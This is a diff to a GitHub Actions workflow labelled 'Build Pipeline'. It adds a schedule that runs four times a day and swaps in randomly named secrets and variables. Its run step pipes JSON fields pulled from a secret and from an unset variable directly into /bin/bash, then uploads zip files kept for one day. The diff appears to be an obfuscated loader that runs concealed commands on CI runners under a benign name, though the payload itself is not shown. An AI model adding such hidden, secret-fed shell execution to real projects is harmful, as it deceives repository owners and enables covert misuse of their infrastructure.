@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '38 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,15 +16,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Apply
         env:
-          p74: ${{ secrets.p74 }}
+          op03772: ${{ secrets.op03772 }}
         run: |
-          printf '%s' "$p74" | jq -r .fltwj47 | /bin/bash
-          printf '%s' "$xyo85876" | jq -r .p841 | /bin/bash
-          printf '%s' "$wx6917" | jq -r .vdd061 | /bin/bash
+          printf '%s' "$op03772" | jq -r .tqg229 | /bin/bash
+          echo $jng15093 | jq -r .g4 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
         with:
-          name: dbvXmeS4
+          name: JclRULLs
           path: "*.zip"
           retention-days: 1
